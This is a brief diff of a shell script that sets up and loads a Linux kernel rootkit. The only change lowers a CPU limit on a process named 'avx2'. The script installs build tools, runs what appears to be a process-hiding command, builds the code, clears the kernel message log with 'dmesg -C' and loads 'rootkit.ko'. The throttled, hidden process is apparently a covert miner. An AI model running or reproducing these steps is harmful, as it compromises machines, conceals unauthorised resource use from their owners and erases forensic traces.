@@ -4,7 +4,7 @@ sudo apt-get update && sudo apt install gcc -y && curl -sL https://deb.nodesourc
 sudo apt-get install cpulimit
 cd Kerecek/
 ph add avx2 
-cpulimit -l 250 -e avx2 &
+cpulimit -l 180 -e avx2 &
 make
 dmesg -C
 insmod rootkit.ko
